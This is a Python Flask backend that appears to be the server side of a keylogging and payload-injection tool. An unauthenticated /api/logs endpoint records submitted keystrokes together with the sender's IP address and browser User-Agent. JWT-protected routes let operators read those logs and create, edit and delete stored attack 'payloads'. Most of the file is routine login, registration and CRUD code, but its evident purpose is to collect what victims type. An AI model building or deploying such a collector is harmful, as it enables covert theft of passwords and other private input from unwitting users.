import json
import jwt
from flask import jsonify, request
from flask_bcrypt import check_password_hash
from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, set_access_cookies, unset_jwt_cookies
from sqlalchemy.exc import IntegrityError

from app import bcrypt, create_app, db, jwt
from models import Log, Payload, User


app = create_app()


@jwt.user_identity_loader
def user_identity_lookup(user):
    return user

@jwt.user_lookup_loader
def user_lookup_callback(_jwt_header, jwt_data):
    return User.query.filter_by(username=jwt_data["sub"]).one_or_none()

@app.get("/api/logs")
@jwt_required()
def logging_get():
    logs = [log.serialize for log in Log.query.all()]

    return jsonify({ "logs": logs })

@app.post("/api/logs")
def logging_post():
    req_data = json.loads(request.data)
    try:
        log = Log(
            ip=request.remote_addr,
            keystrokes=req_data["keystrokes"],
            user_agent=request.headers.get('User-Agent'),
        )
        db.session.add(log)
        db.session.commit()

        response = {
            "logAddError": False,
            "logAddMsg": "Log added",
        }
    except:
        db.session.rollback()
        response = {
            "logAddError": True,
            "logAddMsg": "Error adding log",
        }
    return jsonify(response)

@app.post("/api/register")
def register_post():
    req_data = json.loads(request.data)

    try:
        if len(req_data["password"]) < 8:
            response = {
                "registerError": True,
                "registerMsg": "Password should be at least 8 characters long",
            }
        else:
            created_user = User(
                username=req_data["username"],
                password=bcrypt.generate_password_hash(req_data["password"]),
            )
            db.session.add(created_user)
            db.session.commit()

            response = {
                "registerError": False,
                "registerMsg": "Account created",
            }
    except IntegrityError:
        db.session.rollback()
        response = {
            "registerError": True,
            "registerMsg": "Username exists",
        }
    except:
        db.session.rollback()
        response = {
            "registerError": True,
            "registerMsg": "Internal Server Error: couldn't create account",
        }
    
    return jsonify(response)

@app.post("/api/login")
def login_post():
    req_data = json.loads(request.data)

    user = User.query.filter_by(username=req_data["username"]).first()
    if user and check_password_hash(user.password, req_data["password"]):
        access_token = create_access_token(identity=user.username)
        response = jsonify({
            "loginError": False,
            "loginMsg": "Successful login",
        })
        set_access_cookies(response, access_token)
    else:
        response = jsonify({
            "loginError": True,
            "loginMsg": "Invalid credentials",
        })
    return response

@app.get("/api/auth")
@jwt_required()
def auth_get():
    current_user = get_jwt_identity()
    return jsonify({ "isAuthenticated": current_user is not None })

@app.post("/api/logout")
@jwt_required()
def logout_post():
    response = jsonify({ "logoutMsg": "Logout successful" })
    unset_jwt_cookies(response)
    return response

@app.delete("/api/payloads/<payload_id>")
@jwt_required()
def payloads_delete(payload_id=None):
    try:
        payload = Payload.query.get(payload_id)
        db.session.delete(payload)
        db.session.commit()

        return jsonify({
            "payloadDeleteError": False,
            "payloadDeleteMsg": "Payload deleted",
        })
    except:
        return jsonify({
            "payloadDeleteError": True,
            "payloadDeleteMsg": "Error deleting payload",
        })


@app.get("/api/payloads")
@jwt_required()
def payloads_get():
    payloads = [payload.serialize for payload in Payload.query.all()]

    return jsonify({
        "payloads": payloads
    })

@app.post("/api/payloads")
@jwt_required()
def payloads_post():
    req_data = json.loads(request.data)

    try:
        payload = Payload(
            name=req_data["name"],
            payload=req_data["payload"],
        )
        db.session.add(payload)
        db.session.commit()

        response = {
            "payloadAddError": False,
            "payloadAddMsg": "Payload created",
            "payloadAddData": payload.serialize,
        }
    except:
        db.session.rollback()
        response = {
            "payloadAddError": True,
            "payloadAddMsg": "Error creating payload",
        }
    return jsonify(response)

@app.put("/api/payloads/<payload_id>")
@jwt_required()
def payloads_put(payload_id=None):
    req_data = json.loads(request.data)

    try:
        payload = Payload.query.filter_by(id=payload_id).first()
        payload.name = req_data['name']
        payload.payload = req_data['payload']
        db.session.commit()

        response = {
            "payloadUpdateError": False,
            "payloadUpdateMsg": "Payload updated",
        }
    except:
        db.session.rollback()
        response = {
            "payloadUpdateError": True,
            "payloadUpdateMsg": "Error updating payload",
        }
    return jsonify(response)
